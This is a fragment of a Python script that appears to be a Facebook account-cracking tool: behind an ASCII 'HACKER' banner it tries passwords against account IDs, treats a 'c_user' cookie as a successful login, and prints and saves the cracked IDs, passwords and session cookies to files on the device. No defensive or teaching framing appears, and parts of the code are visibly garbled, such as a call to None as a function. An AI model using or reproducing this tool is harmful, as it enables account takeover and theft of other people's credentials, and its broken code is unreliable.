...
logo = (""""\033[132m          _______  _______  _        _______  _______                         _______ 
|\     /|(  ___  )(  ____ \| \    /\(  ____ \(  ____ )     |\     /||\     /|/ ___   )
| )   ( || (   ) || (    \/|  \  / /| (    \/| (    )|     ( \   / )( \   / )\/   )  |
| (___) || (___) || |      |  (_/ / | (__    | (____)| _____\ (_) /  \ (_) /     /   )
|  ___  ||  ___  || |      |   _ (  |  __)   |     __)(_____)) _ (    \   /     /   / 
| (   ) || (   ) || |      |  ( \ \ | (      | (\ (         / ( ) \    ) (     /   /  
| )   ( || )   ( || (____/\|  /  \ \| (____/\| ) \ \__     ( /   \ )   | |    /   (_/\
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100078348850058')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[GR-ALEX-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/GR-ALEX-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[GR-ALEX-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/GR-ALEX-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[GR-ALEX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
